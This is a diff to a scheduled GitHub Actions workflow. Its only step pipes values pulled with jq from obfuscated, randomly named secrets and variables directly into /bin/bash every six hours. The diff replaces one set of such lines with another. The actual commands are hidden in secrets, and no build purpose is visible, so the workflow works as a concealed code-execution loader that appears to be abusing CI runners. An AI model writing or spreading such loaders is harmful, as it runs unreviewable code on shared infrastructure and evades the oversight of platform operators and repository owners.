@@ -1,29 +1,25 @@
 name: vaultertransit
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
+    - cron: '27 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: vaultertransit
         env:
-          qfdn67398: ${{ secrets.qfdn67398 }}
+          s09156: ${{ secrets.s09156 }}
         run: |
-          echo $qfdn67398 | jq -r .jrlyr29 | /bin/bash
-          echo $ma0 | jq -r .wdjv86138 | /bin/bash
-          echo $oigz019 | jq -r .zknw6613 | /bin/bash
-          echo $zq20046 | jq -r .ubsb52553 | /bin/bash
-          echo $oqw43 | jq -r .ajfcr166 | /bin/bash
-          echo $wh25031 | jq -r .tdttd1 | /bin/bash
-          echo $zf833 | jq -r .etm775 | /bin/bash
-          echo $a4 | jq -r .enxu45 | /bin/bash
-          echo $jgv22741 | jq -r .yd09 | /bin/bash
-          echo $vvfvh751 | jq -r .oelo866 | /bin/bash
-          echo $ic85 | jq -r .nsr544 | /bin/bash
-          echo $zb73685 | jq -r .wb987 | /bin/bash
-          echo $ndoon1 | jq -r .ox590 | /bin/bash
-          echo $pwxfn55321 | jq -r .sj183 | /bin/bash
+          echo $s09156 | jq -r .jq96 | /bin/bash
+          echo $hec0393 | jq -r .oll9 | /bin/bash
+          echo $gz9 | jq -r .vbvly656 | /bin/bash
+          echo $rgqt86 | jq -r .p14 | /bin/bash
+          echo $daw1498 | jq -r .przk8 | /bin/bash
+          echo $atbkp7962 | jq -r .mn97100 | /bin/bash
+          echo $nxjq81 | jq -r .sj10 | /bin/bash
+          echo $g965 | jq -r .otiw7744 | /bin/bash
 
